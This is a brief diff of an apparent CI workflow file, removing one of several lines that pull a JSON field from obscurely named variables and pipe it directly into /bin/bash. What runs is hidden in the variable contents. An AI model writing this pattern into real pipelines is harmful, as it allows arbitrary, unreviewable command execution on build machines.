@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$eu1532" | jq -r .cz891 | /bin/bash
           echo $hheu4 | jq -r .v15072 | /bin/bash
           printf '%s' "$gp1" | jq -r .qsc02 | /bin/bash
-          printf '%s' "$fiavk41" | jq -r .e160 | /bin/bash
           printf '%s' "$hmob0969" | jq -r .diykd158 | /bin/bash
 
       - name: Save output
